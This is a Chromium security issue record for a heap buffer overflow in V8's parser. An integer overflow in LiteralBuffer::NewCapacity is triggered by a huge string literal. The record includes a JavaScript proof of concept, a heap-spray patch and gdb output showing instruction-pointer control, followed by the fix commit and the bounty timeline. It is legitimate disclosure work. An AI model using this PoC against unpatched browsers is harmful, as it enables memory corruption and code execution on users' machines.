# Security: Heap buffer overflow in the V8 language parser

| Field | Value |
|-------|-------|
| **Issue ID** | [40093436](https://issues.chromium.org/issues/40093436) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Parser |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | fo...@gmail.com |
| **Assignee** | ve...@chromium.org |
| **Created** | 2018-12-13 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

A heap buffer overflow is possible due to an integer overflow in the  

\*NewCapacity\* function:

```
int Scanner::LiteralBuffer::NewCapacity(int min_capacity) {  
  int capacity = Max(min_capacity, backing_store_.length());  
  int new_capacity = Min(capacity \* kGrowthFactory, capacity + kMaxGrowth);   
  return new_capacity;  
}  
  
void Scanner::LiteralBuffer::ExpandBuffer() {  
  Vector<byte> new_store = Vector<byte>::New(NewCapacity(kInitialCapacity));  
  printf("Memcpy(%p, %p, 0x%x)\n", new_store.start(), backing_store_.start(),   
    position_);  
  MemCopy(new_store.start(), backing_store_.start(), position_);  
  backing_store_.Dispose();  
  backing_store_ = new_store;  
}  

```

We can control `backing_store_.length()` by varying the length of a JavaScript  

string. A huge JavaScript string leads to a huge `capacity` value, which can  

make the expression `capacity \* kGrowthFactory` overflow, so that  

`new_capacity` will be set to a smaller value than the previous capacity.  

In consequence, the next `MemCopy` will write more bytes into the vector than  

were previously allocated, causing memory corruption.

**VERSION**  

D8 Version: V8 7.2.502  

Chrome Version: Chromium 72.0.3626.0 stable  

Operating System: Linux 4.15.0-42-generic x86\_64 (Ubuntu)

**REPRODUCTION CASE**

```
let s = String.fromCharCode(0x4141).repeat(0x10000001) + "A";  
s = "'"+s+"'";  
eval(s);  

```

The PoC can be directly executed with a release build of D8 via `./d8 poc.js`.  

For a debug build the DCHECK in `Vector::length()` from the file  

`v8/src/vector.h` needs to be removed to successfully trigger the bug.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: Tab (V8 => Renderer)  

Crash State: See `crash_asan.log`

EXPLOITABILITY  

A simple way to demonstrate exploitability is to add a simple heap spray by  

applying the patch below:

```
diff --git a/src/parsing/parsing.cc b/src/parsing/parsing.cc  
index 378023cbeb..f76595f0fb 100644  
--- a/src/parsing/parsing.cc  
+++ b/src/parsing/parsing.cc  
@@ -18,6 +18,15 @@ namespace internal {  
 namespace parsing {  
   
 bool ParseProgram(ParseInfo\* info, Isolate\* isolate) {  
+  const int size = 0x20000000/0x40;  
+  void\*\* p = (void\*\*) malloc(size \* sizeof(void\*));  
+  for (int i = 0; i < size; i++) {  
+    p[i] = malloc(0x40);  
+  }  
+  for (int i = 0; i < size; i++) {  
+    free(p[i]);  
+  }  
+  
   DCHECK(info->is_toplevel());  
   DCHECK_NULL(info->literal());  

```

Afterwards the PoC can be run with a release build of D8, demonstrating  

RIP control:

```
$ gdb --args out/release/d8 poc.js  
  
>  x/i $rip  
=> 0x7ffff71f7520 <v8::internal::Utf16CharacterStream::ReadBlockChecked()+32>:	  
    call   QWORD PTR [rax+0x18]  
>  info reg rax  
rax            0x4141414141414141	0x4141414141414141  

```

**CREDIT INFORMATION**  

Reporter credit: Dimitri Fourny (Blue Frost Security)

## Attachments

- [crash_asan.log](attachments/crash_asan.log) (text/plain, 14.9 KB)

## Timeline

### ca...@chromium.org (2018-12-13)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>Parser]

### ca...@chromium.org (2018-12-13)

Looks like a high severity bug to me, but passing over to the V8 sheriff to decide. mstarzinger: Can you further triage? Thanks.

### ha...@chromium.org (2018-12-13)

[Empty comment from Monorail migration]

### ms...@chromium.org (2018-12-14)

I can reproduce this with x64.release on tip-of-tree. Toon agreed to take a look. Thanks!

### sh...@chromium.org (2018-12-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-27)

verwaest: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-01-10)

verwaest: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2019-01-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/c7410e8ccff855fdb1a1a0a0c6c2690716a96548

commit c7410e8ccff855fdb1a1a0a0c6c2690716a96548
Author: Toon Verwaest <verwaest@chromium.org>
Date: Fri Jan 11 11:11:14 2019

[parser] LiteralBuffer::ExpandBuffer always grows

Bug: chromium:914736
Change-Id: Id02715b69361d15df23c70f85f3250526369547f
Reviewed-on: https://chromium-review.googlesource.com/c/1405859
Reviewed-by: Leszek Swirski <leszeks@chromium.org>
Commit-Queue: Toon Verwaest <verwaest@chromium.org>
Cr-Commit-Position: refs/heads/master@{#58734}
[modify] https://crrev.com/c7410e8ccff855fdb1a1a0a0c6c2690716a96548/src/parsing/scanner.cc
[modify] https://crrev.com/c7410e8ccff855fdb1a1a0a0c6c2690716a96548/src/parsing/scanner.h


### ve...@chromium.org (2019-01-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-11)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-14)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### pa...@chromium.org (2019-01-17)

Congrats! The Panel decided to reward $7,500 for this report :) 

### fo...@gmail.com (2019-01-17)

Thank you! :)

### aw...@google.com (2019-01-21)

[Empty comment from Monorail migration]

### aw...@google.com (2019-01-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-09)

This bug requires manual review: M73 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### be...@chromium.org (2019-02-13)

Approved for merge to 73, branch 3683.

### aw...@google.com (2019-03-05)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### ya...@huawei.com (2019-04-12)

cve

### sh...@chromium.org (2019-04-19)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mm...@chromium.org (2019-05-13)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-17)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-05-22)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/c7410e8ccff855fdb1a1a0a0c6c2690716a96548

commit c7410e8ccff855fdb1a1a0a0c6c2690716a96548
Author: Toon Verwaest <verwaest@chromium.org>
Date: Fri Jan 11 11:11:14 2019

[parser] LiteralBuffer::ExpandBuffer always grows

Bug: chromium:914736
Change-Id: Id02715b69361d15df23c70f85f3250526369547f
Reviewed-on: https://chromium-review.googlesource.com/c/1405859
Reviewed-by: Leszek Swirski <leszeks@chromium.org>
Commit-Queue: Toon Verwaest <verwaest@chromium.org>
Cr-Commit-Position: refs/heads/master@{#58734}
[modify] https://crrev.com/c7410e8ccff855fdb1a1a0a0c6c2690716a96548/src/parsing/scanner.cc
[modify] https://crrev.com/c7410e8ccff855fdb1a1a0a0c6c2690716a96548/src/parsing/scanner.h


### is...@google.com (2021-01-14)

This issue was migrated from crbug.com/chromium/914736?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093436)*
